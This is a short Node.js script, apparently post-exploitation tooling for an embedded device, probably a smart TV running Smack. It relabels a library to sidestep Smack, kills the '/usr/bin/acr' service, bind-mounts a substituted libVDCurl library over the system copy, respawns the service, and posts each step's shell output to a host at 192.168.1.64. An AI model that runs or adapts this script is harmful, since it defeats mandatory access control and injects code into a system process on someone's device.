"use strict";
var fs = require("fs");
var http = require("http");
var cp = require("child_process");

function post(path, body) {
    var data = JSON.stringify(body);
    var req = http.request({ host: "192.168.1.64", port: 9999, path: path, method: "POST",
        headers: { "Content-Type": "application/json", "Content-Length": Buffer.byteLength(data) } },
        function (res) { console.log("posted " + path + " -> " + res.statusCode); });
    req.on("error", function (e) { console.log("post error " + e.message); });
    req.write(data);
    req.end();
}
function sh(cmd, cap) {
    try { return cp.execSync(cmd + " 2>&1", { encoding: "utf8", timeout: 25000 }).slice(0, cap || 2000); }
    catch (e) { return "ERR " + (e.stdout ? e.stdout : e.message); }
}
var out = {};
out.relabel = sh("chsmack -a _ /opt/acr-ca/libVDCurl.so.0.9 2>&1; ls -laZ /opt/acr-ca/libVDCurl.so.0.9");
out.killold = sh("kill 4385 2>/dev/null; kill $(ps -ef | grep '/usr/bin/acr' | grep -v grep | awk '{print $2}') 2>/dev/null; echo ok");
out.mount = sh("mount --bind /opt/acr-ca/libVDCurl.so.0.9 /usr/lib/libVDCurl.so.0.9 2>&1 && echo BIND_OK");
post("/smack3_a", out);

setTimeout(function () {
    var o = {};
    try {
        var c = cp.spawn("/usr/bin/acr", [], { detached: true, stdio: "ignore" });
        c.unref();
        o.spawn = "pid=" + c.pid;
    } catch (e) { o.spawn = "ERR " + e.message; }
    post("/smack3_b", o);
}, 3000);

setTimeout(function () {
    var o = {};
    o.ps = sh("ps -ef | grep '/usr/bin/acr' | grep -v grep | head -3");
    o.err = sh("tail -2 /tmp/acr.out 2>/dev/null");
    post("/smack3_c", o);
}, 9000);
